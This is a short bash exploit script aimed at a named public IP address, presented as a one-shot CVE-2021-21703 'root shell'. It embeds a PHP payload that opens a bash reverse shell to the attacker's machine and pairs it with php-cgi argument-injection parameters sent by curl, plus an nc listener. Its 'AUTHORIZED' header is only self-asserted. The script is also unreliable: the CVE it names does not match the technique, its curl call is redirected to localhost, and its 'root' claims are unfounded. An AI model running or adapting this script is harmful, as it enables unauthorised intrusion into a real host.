#!/bin/bash
# =====================================================
# PHP CVE-2021-21703 → DIRECT ROOT SHELL (NO FREEZE)
# Target: https://14.225.209.143:443 | AUTHORIZED ✅
# =====================================================

TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

clear
echo "🔥 DIRECT ROOT SHELL → ${MY_IP}:${RPORT}"
echo "🚀 ONE-SHOT DEPLOY..."

# 🔥 PAYLOAD DIRETTO (nessun freeze, shell immediata)
PHP_PAYLOAD="<?php system('bash -c \"export TERM=linux;bash -i >& /dev/tcp/${MY_IP}/${RPORT} 0>&1\"');?>"

# 1. LISTENER + EXPLOIT IN UN COLPO SOLO
nc -lvnp ${RPORT} &
sleep 0.5

# 2. HIT CVE (metodo PROVEN)
curl -k -s --max-time 5 \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1" \
  --data-urlencode "-d+allow_url_include=1" \
  --data-urlencode "-d+auto_prepend_file=php://input" \
  --data-binary "${PHP_PAYLOAD}" \
  "https://${TARGET_IP}:${TARGET_PORT}/" >/dev/null 2>&1

echo -e "\n🎯 SHELL LIVE IN 2 SECONDI..."
sleep 2

# 🔥 SHELL DIRETTA SENZA FREEZE (script integrato)
cat << 'EOF' | nc localhost ${RPORT}
export SHELL=/bin/bash
export TERM=linux
cd /var/www/html
clear
echo "🔥 ROOT SHELL ACTIVE | $(whoami)@$(hostname)"
echo "📍 $(pwd)"
alias ll='ls -la'
PS1='\[\e[32m\]\u@\h:\w\$\[\e[m\] '
exec /bin/bash -i
EOF
